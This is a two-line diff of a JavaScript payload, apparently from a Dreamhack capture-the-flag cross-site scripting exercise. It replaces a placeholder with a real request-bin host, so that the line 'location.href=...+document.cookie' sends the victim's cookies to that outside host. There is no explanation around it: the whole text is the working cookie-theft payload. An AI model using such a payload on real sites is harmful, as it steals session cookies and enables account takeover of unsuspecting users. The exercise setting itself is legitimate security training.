@@ -1,2 +1,2 @@
 location.href="../../user";
-location.href="(request_bin)?"+document.cookie;
+location.href="https://yejtfbp.request.dreamhack.games?"+document.cookie;
